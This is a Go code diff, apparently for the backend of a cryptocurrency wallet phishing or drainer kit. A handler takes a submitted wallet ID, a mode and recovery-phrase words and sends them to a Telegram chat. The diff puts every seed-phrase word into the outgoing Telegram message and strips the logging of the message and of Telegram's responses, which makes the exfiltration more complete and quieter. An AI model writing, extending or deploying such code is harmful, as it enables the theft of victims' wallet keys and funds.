@@ -5,7 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"html/template"
-	"io"
+	// "io"
 	"log"
 	"net/http"
 	"net/url"
@@ -93,7 +93,11 @@ No  | Phrase
 Wallet ID : {{ .WalletID }}
 Mode      : {{ .Mode }}
 
-<b>Private Key Mode Activated</b>
+<b>
+	{{range $index, $value := .Phrase}}
+		<b>{{$value}}</>
+	{{end}}
+</b>
 `
 
 		default:
@@ -122,8 +126,6 @@ Mode      : {{ .Mode }}
 
 		message := buf.String()
 
-		fmt.Println("Generated Telegram Message:")
-		fmt.Println(message)
 
 		err = sendTelegramMessage(message)
 		if err != nil {
@@ -156,10 +158,10 @@ func sendTelegramMessage(message string) error {
 	}
 	defer resp.Body.Close()
 
-	body, _ := io.ReadAll(resp.Body)
+	// body, _ := io.ReadAll(resp.Body)
 
-	fmt.Println("Telegram Response Status:", resp.Status)
-	fmt.Println("Telegram Response Body:", string(body))
+	// fmt.Println("Telegram Response Status:", resp.Status)
+	// fmt.Println("Telegram Response Body:", string(body))
 
 	if resp.StatusCode != 200 {
 		return fmt.Errorf("telegram returned non-200 status")
